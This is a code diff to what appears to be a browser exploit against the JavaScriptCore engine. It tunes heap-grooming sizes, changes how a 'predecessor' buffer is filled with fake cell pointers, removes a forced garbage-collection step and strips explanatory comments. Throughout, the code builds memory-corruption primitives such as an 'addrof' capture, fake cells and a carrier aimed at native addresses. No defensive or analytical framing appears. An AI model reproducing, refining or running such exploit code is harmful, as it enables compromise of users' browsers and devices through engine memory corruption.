@@ -1,4 +1,4 @@
-let DRAIN_COUNT = 256;
+let DRAIN_COUNT = 512;
 const AUTO_RETRY_DELAY_MS = 50;
 
 const K = 2;
@@ -17,9 +17,9 @@ const CARRIER_SLOTS = (function () {
     try {
         const q = new URLSearchParams(location.search).get("slots");
         const n = q ? parseInt(q, 10) : 0;
-        if (n >= 100000 && n <= 9000000) return n;
+        if (n >= 100000 && n <= 12000000) return n;
     } catch (e) { }
-    return 4000000;
+    return 9000000;
 })();
 const CARRIER_BYTES = CARRIER_SLOTS * 8;
 const CAPTURE_DELAY_MS = 50;
@@ -42,13 +42,13 @@ const _gOverride = (function () {
 const _g = (name, dflt) => (typeof _gOverride[name] === "number" ? _gOverride[name] : dflt);
 if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;
 
-const DRAIN_SIZE = _g("drainsz", 0x2000);
-const SLAB_SIZE = _g("slab", 0x800000);
+const DRAIN_SIZE = _g("drainsz", 0x10000);
+const SLAB_SIZE = _g("slab", 0x400000);
 const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x81000);
 const SEPARATOR_SIZE = _g("sep", 0x10000);
 const EARLY_HOLE_SIZE = _g("early", 0x70000);
 const GUARD_SIZE = _g("guard", 0x90000);
-const PREDECESSOR_SIZE = _g("pred", 0xa0000);
+const PREDECESSOR_SIZE = _g("pred", 0x80000);
 const FINAL_HOLE_SIZE = _g("final", 0x80000);
 
 const RW_BUFFER_SIZE = 0x100;
@@ -651,7 +651,7 @@ function buildAndStoreGraph() {
     let pos = 0;
     
     for (let b = 0; b < FILLER_BIGINTS; ++b)
-        fillerGraph[pos++] = 0x7fffffff + b; // Plain number instead of BigInt
+        fillerGraph[pos++] = 0x7fffffff + b;
         
     for (let o = 0; o < FILLER_OBJECTS; ++o)
         fillerGraph[pos++] = {};
@@ -696,8 +696,6 @@ function runAddrofCapture() {
         for (let i = 0; i < 16; i++)
             capturedWords[i] = capturedString.charCodeAt(7 + i);
 
-        // The 32 MB getterCarrier array and its string are dead here.
-        // Null the whole chain so JSC can reclaim them before the walk.
         leakedScope = null;
         getterCarrier = null;
         preparedSymbolObject = null;
@@ -907,7 +905,6 @@ function loadHistoryCritical() {
             emit("FUNC-HEADER-WEAK",
                 `addr=${hex(nativeTargetAddress)}`
                 + `-bytes=${dumpHex(holderHeader, HOLDER_BYTES)}`);
-            // Diagnostic only. functionHeaderOK below is the real gate.
         }
 
         aimCarrier(candidate, nativeTargetAddress);
@@ -1062,23 +1059,18 @@ function runGroomAndLoad() {
         const guard = buffer(GUARD_SIZE);
         const finalHole = buffer(FINAL_HOLE_SIZE);
 
-        // FIX: Use a JS Array instead of ArrayBuffer. 
-        // JS Arrays are not zeroed on free, unlike ArrayBuffers.
-        let predecessor = new Array(PREDECESSOR_SIZE / 8);
-        for (let i = 0; i < predecessor.length; i++) {
-            predecessor[i] = fakeAddress; 
-        }
-        
+        let predecessor = buffer(PREDECESSOR_SIZE);
+        fillRawCellPointers(predecessor, fakeAddress);
+
         keepAlive[keepIndex++] = separator;
         keepAlive[keepIndex++] = guard;
-        // DO NOT keep predecessor in keepAlive. We need it to be freed.
-        
+        keepAlive[keepIndex++] = predecessor;
+
         emit("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}`
             + `-fake=${hex(fakeAddress)}`);
 
         criticalBarrier(fakeAddress, targetAddress);
 
-        // Free the ArrayBuffers (this creates zeroed holes)
         channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
             earlyHole, finalHole]);
         if (butterflyHole1.byteLength !== 0 || butterflyHole2.byteLength !== 0
@@ -1089,19 +1081,6 @@ function runGroomAndLoad() {
                 + "," + earlyHole.byteLength
                 + "," + finalHole.byteLength);
         }
-
-        // FIX: Free the predecessor array so the SSV allocator reuses its
-        // non-zeroed memory. We null it out and trigger a GC.
-        predecessor = null;
-        try {
-            if (typeof globalThis.gc === "function") {
-                globalThis.gc();
-            } else {
-                // Attempt to force GC by allocating and dropping a large object
-                let temp = new ArrayBuffer(0x1000000);
-                temp = null;
-            }
-        } catch(e) { console.warn("[core] GC trigger threw:", e); }
 
         channel.port1.close();
         channel.port2.close();
@@ -1133,7 +1112,6 @@ function ensureBarrierNode() {
 }
 
 function defaultCriticalBarrier(fake, target) {
-    // Edit 3: Candidate A - allocate and drop 4 small objects
     const t = [];
     for (let i = 0; i < 4; ++i) t.push({});
     t.length = 0;
@@ -1447,7 +1425,7 @@ export function releaseFakeCell() {
     settleReject = null;
     if (reject !== null) {
         try { reject(new Error("core: released before primitive resolved")); }
-        catch (e) { console.warn("[core.releaseFakeCell] late reject threw:", e); }
+        catch (e) { console.warn("[core] releaseFakeCell late reject threw:", e); }
     }
 
     fakeReleased = true;
